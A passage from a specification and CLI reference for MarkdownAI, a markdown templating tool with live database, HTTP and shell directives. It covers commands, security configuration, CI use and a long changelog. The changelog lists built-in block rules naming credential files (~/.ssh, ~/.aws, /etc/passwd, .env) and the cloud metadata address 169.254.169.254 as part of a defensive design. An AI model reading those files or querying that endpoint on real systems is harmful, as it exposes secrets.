## Recent Signups
@db using="db" query="db.users.find({},{name:1,email:1,createdAt:1}).sort({createdAt:-1}).limit(10)" | @render type="table"
```

Run `mai build` and this becomes a static markdown snapshot. Serve via MCP and it is live on every read.

---

## Package and Distribution

### Installation

```bash
npm install -g @markdownai/core         # CLI (mai) -- full standalone toolchain
npm install -g @markdownai/mcp          # MCP server -- AI client integration
```

The `mai` command is installed by `@markdownai/core`. The MCP server is an optional addition for AI client integration. Full MarkdownAI value is available from `mai` alone -- no AI client, no MCP server required.

---

## The CLI (`mai`)

The `mai` CLI is the standalone MarkdownAI runtime installed via `@markdownai/core`. It covers the complete workflow from authoring to production output without requiring any AI client or MCP server.

```json
{
  "name": "@markdownai/core",
  "bin": {
    "mai": "./bin/cli.js"
  }
}
```

### Resolution Tiers

Three commands represent three levels of resolution:

**`mai strip`** -- syntax removal only. No connections required. Works offline. Produces clean vanilla markdown by removing all `@syntax`. Note: documents with `@if` conditions require `--env` to evaluate conditionals correctly -- without it, all unset variables evaluate to false. See Conditional Stripping Behavior in the Toolchain Architecture section.

**`mai render`** -- static resolution. Resolves everything that does not require a live connection: `@include`, `@import`, `@env`, `@define`, `@call`, `@if`, `@list`, `@read`, `@tree`, `@date`, `@count`. No MCP server needed.

**`mai build`** -- full resolution. Everything `render` does plus live directives: `@db`, `@http`, `@query`. Requires environment with valid connection strings. Produces a completely static snapshot of the document at build time.

---

### Core Commands

**`mai strip`**

Removes all MarkdownAI syntax. Output is clean standard markdown any renderer can handle.

```bash
mai strip input.md                        # stdout
mai strip input.md -o output.md           # file output
mai strip ./docs/ -o ./dist/              # directory
mai strip ./docs/ -o ./dist/ --watch      # watch mode
```

**`mai render`**

Resolves all static directives. No live connections required.

```bash
mai render input.md                       # stdout
mai render input.md -o output.md          # file output
mai render input.md --env .env            # load env from file
mai render input.md --env .env.staging    # specific env file
mai render ./docs/ -o ./dist/             # directory
mai render ./docs/ -o ./dist/ --watch     # watch mode
```

**`mai build`**

Full resolution including live directives. Produces a static snapshot.

```bash
mai build input.md -o output.md           # single file
mai build input.md --env .env.production  # with env file
mai build ./docs/ -o ./dist/              # directory
mai build ./docs/ -o ./dist/             # @query execution governed by security config
```

**`mai watch`**

Watch mode for any command. Tracks the full dependency tree -- changes to any `@include` or `@import` dependency trigger a rebuild of all affected files.

```bash
mai watch input.md -o output.md --env .env
mai watch ./docs/ -o ./dist/ --env .env.development
mai watch input.md --command render       # default
mai watch input.md --command build        # live directives on every save
```

---

### Utility Commands

**`mai validate`**

Validates syntax and reports all errors and warnings without producing output. Reports jailed directives that will be stripped at build time. Use during authoring and in CI.

```bash
mai validate input.md
mai validate ./docs/
mai validate ./docs/ --strict             # treat warnings as errors, halt on any
mai validate ./docs/ --verbose            # show all stripped directives
```

Output:

```
✓ @markdownai header found
✓ 3 @import directives resolved
✓ 12 @include directives resolved
✗ @include ./missing.md -- file not found (line 12)
✗ @call undefined_macro -- macro not defined (line 34)
⚠ @db query -- no security config for this connection (line 45) -- will be stripped
⚠ @query "git log --oneline -1" -- shell not in allowlist (line 67) -- will be stripped
⚠ @env API_KEY -- no fallback defined (line 89)

2 errors, 3 warnings
```

Exit code `0` on success, `1` on errors. Clean CI integration.

**`mai security`**

Manages the security configuration at `~/.markdownai/security.json`.

```bash
mai security init                              # interactive setup wizard
mai security init --from .markdownai.json      # wizard pre-loaded from project hints
mai security show                              # display full current config
mai security disable                           # disable all dynamic execution

# Shell config
mai security shell enable
mai security shell disable
mai security shell add "git log *"
mai security shell remove "git log *"
mai security shell list
mai security shell test "git log --oneline -1"   # outputs: ALLOWED / BLOCKED + reason

# Database config
mai security db add primary
mai security db set primary.readonly true
mai security db allow-collection primary products
mai security db deny-keyword primary DROP
mai security db test primary "db.users.find()"   # outputs: ALLOWED / BLOCKED + reason
mai security db disable primary

# HTTP config
mai security http enable
mai security http add-domain api.github.com
mai security http remove-domain api.github.com
mai security http test "https://api.github.com/repos/markdownai/core"
mai security http disable

# Audit log
mai security audit show                        # last 50 entries
mai security audit show --blocked              # blocked attempts only
mai security audit show --alerts               # SECURITY_ALERT entries only
mai security audit show --since 2025-01-01
mai security audit clear
```

**`mai parse`**

Outputs the raw AST as JSON. For debugging, tooling development, and verifying parser behavior.

```bash
mai parse input.md                        # full AST as JSON
mai parse input.md --node include         # filter to specific node type
mai parse input.md --node define          # see all macro definitions
mai parse input.md --node phase           # see all phase declarations
mai parse input.md --pretty               # pretty-printed JSON
```

**`mai eval`**

Evaluates a single MarkdownAI expression against the current environment. Invaluable for debugging conditional logic.

```bash
mai eval "env.TIER == 'enterprise'" --env .env
mai eval "env.API_URL ?? 'http://localhost:3000'" --env .env
mai eval "file.exists './src/enterprise/'"
mai eval "file.isFile './config/prod.json'"
mai eval "!file.isDir './src/legacy/'"
mai eval "env.NODE_ENV == 'production' && file.exists './.env.production'" --env .env
```

Output:

```
true
http://localhost:3000
false
true
```

**`mai list-phases`**

Lists all phases defined in a document with their transitions.

```bash
mai list-phases input.md
```

Output:

```
Phases in input.md:

  init     → plan
  plan     → build
  build    → test, @call post_phase
  test     → deploy, @call post_phase
  deploy   (terminal)
```

**`mai list-macros`**

Lists all macros defined in a document and its imports.

```bash
mai list-macros input.md
```

Output:

```
Macros in input.md:

  footer         defined in: shared/defaults.md
  post_phase     defined in: shared/defaults.md
  user_row       defined in: sections/users.md  [local]
  section_header defined in: input.md
```

**`mai list-imports`**

Shows the full dependency tree -- every `@import` and `@include`, what each contributes, conditional status.

```bash
mai list-imports input.md
```

Output:

```
input.md
├── @import ./shared/defaults.md
│     ├── connections: primary, analytics
│     └── macros: footer, post_phase
├── @import ./shared/env.md
│     └── env defaults: 8 variables
├── @include ./sections/intro.md
├── @include ./phases/build.md
│     └── @include ./shared/security.md  [conditional: STRICT_MODE]
└── @include ./sections/footer.md
```

**`mai serve`**

Starts the MCP server for AI client integration.

```bash
mai serve                                 # start MCP server
mai serve --cwd /path/to/project          # set working directory
mai serve --port 3000                     # custom port
```

**`mai cache`**

Manages the document cache. See the Caching section for full documentation.

```bash
mai cache show                            # all cached entries
mai cache show input.md                   # entries for a specific document
mai cache show --expired                  # entries past their TTL
mai cache clear                           # clear all caches
mai cache clear --session                 # session cache only
mai cache clear --persist                 # disk cache only
mai cache clear input.md                  # all caches for a document
mai cache clear --directive db            # all @db results
mai cache seed input.md                   # re-execute all @cache directives
mai cache seed input.md --env .env.production  # seed from specific environment
mai cache seed input.md --directive db    # seed only @db directives
```

**`mai init`**

Installs the PreToolUse hook into the AI client config. One-time setup for AI integration.

```bash
mai init                                  # auto-detect AI client config
mai init --client claude-code             # explicit client
mai init --client cursor                  # other MCP clients
```

---

### Universal Flags

All commands support:

```bash
--env <file>              # load environment from .env file
--env.production          # shorthand for --env .env.production
--cwd <path>              # set working directory (default: current)
--silent                  # suppress all output except FATAL and SECURITY_ALERT
--verbose                 # print WARN and above to terminal as they happen
--strict                  # treat WARN as errors, halt on any stripped directive
--watch                   # watch mode (strip, render, build)
--output, -o <path>       # output file or directory
--format <format>         # output format: md (default), json (AST)
--security-config <path>  # alternate security config (default: ~/.markdownai/security.json)
--log <path>              # alternate runtime log path
--version                 # print version
--help                    # print help
```

Note: `--silent` never suppresses `SECURITY_ALERT` or `FATAL` events. These always print.

---

### The Non-MCP Workflow

Full MarkdownAI without any AI client:

```bash
# Install
npm install -g @markdownai/core

# Author
vim my-docs/index.md

# Validate during authoring
mai validate my-docs/index.md

# Watch mode during development
mai watch my-docs/ -o dist/ --env .env.development

# Debug a failing conditional
mai eval "env.TIER == 'enterprise'" --env .env.development

# Inspect the dependency tree
mai list-imports my-docs/index.md

# Build for production
mai build my-docs/ -o dist/ --env .env.production

# Strip for distribution to non-MarkdownAI consumers
mai strip my-docs/ -o dist-clean/

# CI validation
mai validate my-docs/ --strict && mai build my-docs/ -o dist/
```

No AI client. No MCP server. No extra configuration. The CLI is a complete standalone product.

---

### CI Integration

```yaml
# GitHub Actions example
- name: Validate MarkdownAI
  run: mai validate ./docs/ --strict

- name: Build docs
  run: mai build ./docs/ -o ./dist/
  env:
    MONGODB_URI: ${{ secrets.MONGODB_URI }}
    COMPANY_NAME: "My Company"
    SUPPORT_EMAIL: "support@example.com"

- name: Strip for distribution
  run: mai strip ./docs/ -o ./dist-clean/
```

---

### npm Namespace

| Package | Responsibility |
|---|---|
| `@markdownai/core` | CLI (`mai`) -- complete standalone toolchain |
| `@markdownai/parser` | AST foundation -- published standalone |
| `@markdownai/engine` | Template execution -- internal |
| `@markdownai/renderer` | Markdown formatting -- published standalone |
| `@markdownai/mcp` | MCP server -- AI client integration |
| `@markdownai/vscode` | VS Code extension (planned) |
| `@markdownai/spec` | Machine-readable spec (planned) |

---

## Graceful Degradation Reference

How every directive behaves in a standard markdown renderer with no MarkdownAI support:

| Directive | Standard Renderer Output |
|---|---|
| `@markdownai` | Plain text, first line |
| `@include ./file.md` | Plain text -- file not inlined |
| `@import ./file.md` | Plain text -- definitions not loaded |
| `@env VAR` | Plain text -- not resolved |
| `@define ... @end` | `@define`/`@end` as plain text; body renders as markdown |
| `@call macro` | Plain text -- not expanded |
| `@connect ...` | Plain text |
| `@list ...` | Plain text -- not resolved |
| `@read ...` | Plain text -- not resolved |
| `@query ...` | Plain text -- not executed |
| `@db ...` | Plain text -- not executed |
| `@http ...` | Plain text -- not executed |
| `@tree ...` | Plain text -- not resolved |
| `@date ...` | Plain text -- not resolved |
| `@count ...` | Plain text -- not resolved |
| `@render ...` | Plain text |
| `@if ... @endif` | Both branches render as plain markdown |
| `@phase ... @end` | `@phase`/`@end` as plain text; body renders |
| ` ```mai-graph ` | Mermaid diagram or plain code block |

| `{{ expression }}` | Renders literally as `{{ expression }}` -- readable placeholder |
| `\{{ expression }}` | Renders as `{{ expression }}` -- same as processed output | The document is always human-readable. The structure is always visible to the author.

---

## Versioning and Changelog

Follows semantic versioning.

- **Patch** -- clarifications, examples, editorial
- **Minor** -- new directives, new options
- **Major** -- breaking changes to existing behavior

### v1.0 -- Review Pass
- **File existence API:** Completed `file.exists`, `file.isFile`, `file.isDir` expression functions
- `file.exists "./path"` -- true if path exists as file or directory
- `file.isFile "./path"` -- true if path exists and is a file specifically
- `file.isDir "./path"` -- true if path exists and is a directory specifically
- Negation via `!` -- `!file.exists`, `!file.isFile`, `!file.isDir` -- no separate not_exists needed
- Full expression system applies -- `&&`, `||`, `?:`, grouping all work with file functions
- Added to operator reference table with MarkdownAI source column
- Updated `mai eval` examples with `file.isFile` and `!file.isDir`
- Added combined examples: `env.X == "y" && file.exists "./path"`
- Built-in commands (grep, sort, head, tail, wc -l, uniq) implemented in Node.js -- work everywhere
- Shell-dependent commands (awk, sed, jq, xargs, cut etc) require Unix/WSL
- Added `builtin` PipeStage type to PipeNode TypeScript interface
- Platform behavior table: Linux/macOS/WSL all work, Windows native only gets built-ins
- `mai validate` warns on Windows when shell-dependent commands detected
- Engine detects platform at startup -- shell-dependent stages stripped with WARN on Windows
- Updated core principle 7 -- no longer says "Linux toolchain available everywhere"
- Updated source/transform/sink diagram to show built-in vs shell-dependent split
- Built-in commands cover 90% of real MarkdownAI pipe use cases cross-platform
- Added `@if` condition evaluation table to stripper section covering all scenarios
- Unset variable with no fallback → false → `@else` renders, WARN logged
- Recommended pattern: `mai strip --env .env.production` once per environment variant
- `mai validate` reports all unset variables that will cause wrong conditional output
- Updated `mai strip` description in CLI resolution tiers with conditional note
- Updated `conditional` AST node stripper table entry with unset variable behavior reference
- Updated `@if` "what the stripper does" note to reference the full behavior table
- `.env` files are flat key=value -- `path` dot-notation never applies
- `key="KEY_NAME"` is the correct option for `.env` files
- Using `path` on `.env` is now a parse error with actionable message
- Updated supported file types table with Access Option column showing correct option per format
- Updated all options table with Applies to column -- `path`, `key`, `column` are format-specific
- Options used on wrong file type are parse errors -- no silent wrong values
- Linux `ctime` is inode change time not creation time -- silently wrong on most deployments
- Only `type="modified"` and `type="current"` remain as valid options
- Added git-based creation date alternative using `@query git log --diff-filter=A`
- Added format string token reference table to `@date` section
- Added inline example with `type="modified"` and format string combined
- Defined version pin format: `v` + `major.minor` e.g. `v1.0`, `v1.1`, `v2.0`
- Documented version pin behavior: runtime warns if installed version older than pinned version
- Version pin is optional -- absent means no version check performed
- `import` node -- directive line removed, definition registration is engine/renderer concern
- Corrected `@include` stripper description -- clarified file inlining is renderer concern
- Fixed CLI section stripper table -- `@import` was incorrectly described as registering definitions
- Stripper never registers definitions -- that is always an engine concern
- Added `json` to renderer format types table in toolchain section
- Fixed `tree` description in toolchain format table -- ASCII indented tree, not directory tree
- `@graph` is documentation only -- never affects runtime behavior
- `@on complete ->` transitions are always the source of truth for phase sequencing
- Four mismatch scenarios documented with runtime effect and validate behavior table
- `@graph` valid with no phases -- general purpose Mermaid diagram, not phase-specific
- `list_phases()` derives structure from transitions -- graph included for visualization only
- `next_phase()` never consults graph -- transitions only
- Updated MCP server tool descriptions for `list_phases` and `next_phase`
- Removed duplicate `list_phases` entry from MCP tools list
- **Renamed `mdai-graph` to `mai-graph`** -- matches the `mai` CLI name consistently
- All six `mdai-graph` occurrences replaced with `mai-graph` throughout spec
- `@phase` in root document -- valid, phase declarations registered
- `@phase` in `@include`d file -- `@phase`/`@end` tags stripped, body content renders normally
- `@phase` in `@import`ed file -- parse error with actionable message, halts immediately
- Added three-row behavior table to `@phase` section
- Added actionable error message format for `@phase` in imported file
- Updated `@import` processing pipeline -- step 2 now checks for `@phase` before extraction
- Added `@phase` scope rules to parser implementation rules
- Updated stripper rules table with full phase context note
- Added clear scope statement: filesystem only, inline scalar companion to `@list`
- Added options table with `match` and `type`
- Documented pipe pattern for counting non-filesystem sources: `| wc -l`
- Non-filesystem counts use `{{ read ... | wc -l }}`, `{{ list ... | wc -l }}` etc.
- `@http` now documents `method`, `body`, `timeout`, `columns`, `where`, `as`
- `method` defaults to GET -- POST/PUT/DELETE require explicit security config permission
- `body` only valid when method is non-GET
- Headers: `Key=env.VAR` notation, literal credentials blocked by masking system
- `@http` JSON array response supports `columns`, `where`, `as` directly
- Response handling table: JSON object, JSON array, plain text, non-200, timeout behaviors
- `@tree` now has `as` shorthand and a proper options table
- Issue 19 resolved as side effect of completing all source directive option sets
- `mode="keys"`, `mode="values"`, `mode="entries"` -- extract data from JSON objects
- `as` now reserved exclusively for render type shorthand on all source directives
- `mode` and `as` are orthogonal -- `mode` extracts, `as` renders, both can be used together
- Updated `@list` options table with Controls column for clarity
- Added composing example: `mode="entries" as="table"` renders object entries as markdown table
- `where` accepts all JS/bash operators: `&&`, `||`, `!`, `?.`, `??`, `()`, `==`, `!=`, `>`, `<`, `>=`, `<=`
- Left-hand side of `where` expressions is a field name or dot-notation path -- not an env var
- Optional chaining `?.` supported for nullable nested fields in `where`
- Added cross-references from `@list`, `@read`, `@db` where clauses to `@if` operator reference
- `@if` section now explicitly named as the canonical expression system reference
- One expression system, documented once, referenced everywhere it applies
- `PhaseNode` now has explicit `transitions: TransitionNode[]` field
- `TransitionNode` has `event: "complete"` and `action: TransitionAction` union type
- `TransitionAction` covers phase transition, macro call -- extensible via `event` field
- Multiple `@on complete ->` lines execute sequentially top to bottom -- explicitly documented
- `@on complete ->` outside a `@phase` block is a parse error -- not passthrough
- `@on` pattern future-proofed: `event` field reserved for `error`, `timeout` in future versions
- Added `transition` to AST node types table
- Added `@on complete ->` parsing rule to parser implementation rules
- Circular reference -- IN_PROGRESS file encountered again, always FATAL regardless of --strict
- Duplicate @import -- COMPLETE file encountered again via @import, skip silently (first wins)
- Duplicate @include -- COMPLETE file encountered again via @include, render again (intentional)
- Cross-directive circularity detected -- shared stack covers @include→@import→@include cycles
- Error format documented: full chain, file, line, directive type, cycle marker
- Added File Resolution Model to TOC
- Added File Resolution Model section between @import and @env
- `@cache session` -- in-memory cache for session consistency in AI workflows
- `@cache persist` -- disk cache at ~/.markdownai/cache/ for development fixture workflow
- `@cache ttl=N` -- time-to-live in seconds for both session and persist modes
- `@cache mock=./fixture.json` -- hard fixture override, never hits real source
- Cache key generated from full resolved directive string -- different queries = different keys
- Masking applied before caching -- sensitive values never stored in cache
- `mai cache` command suite: show, clear, seed with full filter options
- `invalidate_cache()` MCP server tool -- AI can request fresh data without restarting session
- Added cache.ts to engine package structure
- Added @cache to directives overview table
- Added caching section to TOC
- Documented AI session consistency pattern -- @cache session freezes world at session start
- What to cache reference table with recommendations per directive type
- `@local` is unambiguous -- parameters are inside `()`, `@local` is outside, no parameter starts with `@`
- `@local` is always the last token on `@define` and `@connect` lines
- Added complete `@define` grammar: no params / with params, global / local -- four combinations
- Added complete `@connect` grammar: global / local -- two combinations
- Added `@local` parsing rule to parser implementation rules
- Unspecified macro parameters resolve to empty string -- no error, no default value syntax needed
- `{{ param || "default" }}` inside macro body is the idiom for meaningful parameter defaults
- `@env VAR fallback="x"` inside `@import` → registers fallback in shared fallback registry
- `@env VAR` (no fallback) inside `@import` → registers VAR as expected, warns if unset
- Added env resolution order: process.env → --env file → @import fallbacks → fallback= → ""
- Added `envFallbacks` registry to `EngineContext` TypeScript interface
- Added `resolveEnv()` function showing exact resolution logic
- Updated `@env` section with context-aware behavior documentation
- Updated `@import` processing pipeline with explicit step-by-step @env handling
- Document root confinement -- absolute paths and traversal always blocked, immutable
- Built-in path exclusions -- ~/.ssh/*, ~/.aws/*, /etc/passwd, *.key, .env* etc always blocked
- Built-in content masking -- 11 regex patterns covering AWS keys, GitHub tokens, connection strings, private keys, JWTs, generic env values
- `allow_unmasked_paths` -- glob patterns for trusted file paths that skip masking entirely
- `allow_unmasked_patterns` -- value-level exceptions for non-sensitive variables (NODE_ENV, PORT etc)
- `mai security filesystem` command suite -- add-block, allow-path, allow-pattern, test, test-mask
- `test-mask` command -- preview masking output for any file before including it
- `--reveal-masked` flag -- shows which patterns fired without revealing values
- `--allow-traversal` flag -- controlled cross-root access for specific directories only
- `SECURITY_NOTICE` always printed when masking fires
- Added filesystem section to project hint file `.markdownai.json`
- Added `@read` security note referencing filesystem security section
- Updated jail model table to show confinement and masking for static directives
- Updated security principles -- added principle 4 (static directive confinement and masking)
- **Built-in immutable rules:** Shipped with package, cannot be disabled, always_block and always_alert tiers
- **Rule evaluation order:** Built-in rules evaluated first, user config cannot override them
- **Project hint file:** `.markdownai.json` advisory-only, never grants permissions, informs machine owner
- **`mai security` command suite:** Full shell/db/http/audit management commands
- **`mai security init --from .markdownai.json`:** Interactive wizard pre-loaded from project hints
- **`--verbose` flag:** Added to all commands, prints WARN and above to terminal
- **`--silent` note:** Never suppresses SECURITY_ALERT or FATAL
- **`mai validate`:** Now reports jailed directives that will be stripped at build time
- **Cloud metadata blocking:** 169.254.169.254 and equivalents always blocked in built-in HTTP rules
- Established jail-first principle -- all dynamic directives stripped by default
- Added `~/.markdownai/security.json` as the machine-owner-controlled security config
- Documented complete `@query` security: allowlist, deny_patterns, network blocking, confirmation, audit log
- Documented complete `@db` security: operation allowlist, denied keywords, collection restrictions, readonly enforcement, query sanitization
- Documented complete `@http` security: domain allowlist, internal network blocking, method restrictions, response size limits
- Added `mai security` command suite: init, show, test, audit, disable
- Added audit log with structured JSON format covering all dynamic directive outcomes
- Removed `--allow-shell` flag -- replaced by security config file
- Added `--security-config` flag for alternate config path
- Security config lives in home directory -- not in project, not overridable by documents
- Added seven security principles to summary
- Added `pipe` node structure with typed stages to parser spec
- Documented `@render` as pipe sink token -- only valid as final pipe stage, never standalone
- Documented quoted string boundary rule -- `|` inside `"..."` is never a pipe separator
- Documented three valid multi-@ line patterns: pipe chains, phase transitions, nothing else
- Added `@on complete -> @call` as explicitly valid phase transition sub-directive pattern
- Updated parser implementation rules with all three exceptions clearly stated
- Pipe into scalar documented -- final Linux command produces bare string, no `@render` needed
- Documented that directive arguments are always static strings
- Dynamic path/file selection uses `@if` blocks, not ternary inside directive arguments
- Ternary `? :` is valid inside `{{ }}` interpolation only
- Added explicit INVALID examples to the ternary section to prevent confusion
- Added static arguments rule to directives overview with the `@include if` exception noted
- `{{ env.VAR }}`, `{{ date }}`, `{{ count }}`, `{{ read }}` are the inline interpolation forms
- Full JS/bash expression support inside `{{ }}`
- Three immunity rules: fenced code blocks, inline backticks, `\{{` escape
- `\{{` escapes to literal `{{` -- same convention as markdown's `\*`
- Updated `@env`, `@date`, `@count`, `@read` sections to use `{{ }}` for inline usage
- Updated all real-world examples to use `{{ }}` interpolation
- Added `interpolation` AST node type to parser table
- Added `{{ }}` to graceful degradation table
- **Package:** `@markdownai/core` -- scoped under the `@markdownai` npm org
- **CLI command:** `mai` -- short, clean, three characters, installed via `@markdownai/core`
- **Removed `.mdai` extension** -- MarkdownAI works exclusively on `.md` files, detected by the `@markdownai` header. No separate extension needed, no ecosystem split, just markdown.
- Added complete CLI section as a standalone product independent of MCP server
- Added complete CLI section as a standalone product independent of MCP server
- Added `mai strip` -- syntax removal, three resolution tiers documented
- Added `mai render` -- static resolution without live connections
- Added `mai build` -- full resolution including live directives
- Added `mai watch` -- full dependency tree tracking, rebuilds affected files only
- Added `mai validate` -- syntax checking with errors/warnings, CI-ready exit codes
- Added `mai parse` -- raw AST output as JSON for debugging and tooling
- Added `mai eval` -- single expression evaluation against current environment
- Added `mai list-phases` -- phase manifest with transitions
- Added `mai list-macros` -- macro registry with source file and local flag
- Added `mai list-imports` -- full dependency tree visualization
- Added universal flags -- `--env`, `--cwd`, `--silent`, `--strict`, `--watch`, `--allow-shell`
- Added CI integration example
- Added non-MCP complete workflow documentation
- Clarified CLI is the complete standalone product, MCP server is optional AI integration layer
- Added `@import` -- definition-only import, nothing renders, the MarkdownAI module system
- Defined closure semantics for `@include` -- full JavaScript closure model documented
- Added `local=true` flag on `@define` and `@connect` to prevent bubble-up
- Added scope inheritance rules -- what flows down, what bubbles up, sibling ordering
- Added shared library pattern -- `@import ./shared/defaults.md` as a single-line module import
- Added processing pipeline for both `@include` and `@import`
- Added `@include` vs `@import` comparison table
- Updated `@include` conditional syntax to use full JS/bash expression support
- Updated directives overview, AST node types, stripper rules, graceful degradation table
- Updated both package structure listings with `import.ts`
- **Core expression rule:** MarkdownAI expressions follow JavaScript and bash operators -- no new syntax, no exceptions
- Added `&&` logical AND operator to conditionals
- Added `||` logical OR operator and fallback chaining
- Added `!` logical NOT operator
- Added `? :` ternary operator -- inline conditional value resolution
- Added `?.` optional chaining -- safe nested path navigation, returns empty string on missing keys
- Added `??` nullish coalescing -- safer fallback than `||` for numeric and boolean values
- Added `()` grouping for explicit operator precedence
- Added full operator reference table with JS/bash source column
- Added optional chaining support in `@read` path and `columns` dot-notation
- Added ternary usage examples inside `@read`, `@include`, and inline content
- Stated the rule explicitly: valid JS or bash = valid MarkdownAI expression
- Added `@elseif` -- unlimited chained branches on conditional blocks
- Added block nesting support -- `@if` inside `@if`, each with its own `@endif`
- Documented branch evaluation order -- top to bottom, first match wins
- Updated conditional section title to reflect full `@if` / `@elseif` / `@else` / `@endif` syntax
- Added multi-branch and file existence examples with `@elseif`
- Added nested JSON rendering strategies -- full documentation of all five approaches
- Added `@render type="tree"` -- ASCII indented tree for nested structures and hierarchies
- Added `@render type="json"` -- pretty-printed fenced JSON code block
- Added `collapse=true` option to `@read`, `@list` -- stringifies nested objects/arrays inline for flat table rendering
- Added dot-notation support in `columns` for nested key selection e.g. `address.city:City`
- Added array index support in `columns` e.g. `roles[0]:Primary Role`
- Added `jq` pipe strategy for complex JSON reshaping
- Added nested JSON strategy selection guide table
- Updated `@render` type table with `tree` and `json` entries
- Added `as` shorthand to all source directives -- `as="table"` equivalent to `| @render type="table"`
- Added `columns` with `key:Display Name` aliasing syntax to `@list`, `@read`, `@db`
- Added `where` row filtering to `@list`, `@read`, `@db` -- full expression system, field name on left-hand side
- Added full source/transform/sink model documentation with ASCII diagram
- Expanded `@connect` with three connection resolution patterns: named, single auto, inline uri
- Expanded `@db` with inline `uri` option, `columns`, `where`, `as`
- Clarified `@db` output flows into `@render` not into other source directives
- Clarified sources never receive piped input -- they only produce it
- Expanded `@list` to support JSON arrays, JSON objects (keys/values/entries), and CSV files
- Expanded `@read` to support full JSON arrays, entire CSV files, and single CSV column extraction
- Added `path` JSONPath selector to `@list` for nested JSON arrays
- Added `as` option to `@list` for JSON object key/value/entry listing
- Added `columns` and `skip` options to `@list` and `@read` for CSV processing
- Added `column` option to `@read` for single CSV column extraction
- All new `@list` and `@read` outputs are pipe-compatible and `@render`-compatible
- Added complete Toolchain Architecture section
- Defined all six components with clean responsibilities: Parser, Template Engine, Renderer, Stripper, MCP Server, Hook
- Defined `DirectiveModule` interface -- parse, strip, execute in one file per directive
- Defined modular package structure -- one directive file, one format file pattern
- Defined third-party directive plugin architecture via registry
- Added `@markdownai/engine` and `@markdownai/renderer` as separate packages
- Added `mai render` command -- static resolution without live connections
- Added `mai init` command -- installs hook into AI client config
- Defined build order: Parser → Stripper → Renderer → Engine → MCP → Hook
- Clarified stripper responsibility -- syntax removal only, no resolution
- Clarified renderer responsibility -- formatting only, no directive knowledge
- Clarified template engine responsibility -- execution and orchestration only
- Added `@connect` -- data source registry
- Added source directives: `@list`, `@read`, `@query`, `@db`, `@http`, `@tree`, `@date`, `@count`
- Added pipe operator -- full Linux toolchain as pipe stages
- Added `@render` sink with all format types including ASCII charts
- Added `@if` / `@endif` / `@else` conditional blocks
- Added `mai build` command for full static builds with live directives
- Added dual rendering rule for `@graph` -- Mermaid for humans, ASCII for AI
- Added Level 5 and Level 6 to adoption path
- Expanded real-world use cases
- Added `execute_directive` to MCP server tools

### v0.2
- Added `@markdownai` header declaration
- Added runtime detection and hook implementation
- Added full MCP server tool reference
- Added package and distribution section
- Added graceful degradation reference table

### v0.1
- Initial draft
- Core directives: `@include`, `@env`, `@define`, `@call`, `@phase`, `@graph`
- Stripper CLI specification
- MCP server concept

---

*MarkdownAI is an open specification.*
*npm package `markdownai` is reserved.*
*Created by Tim Carter Clausen (TheDecipherist) -- thedecipherist.com*
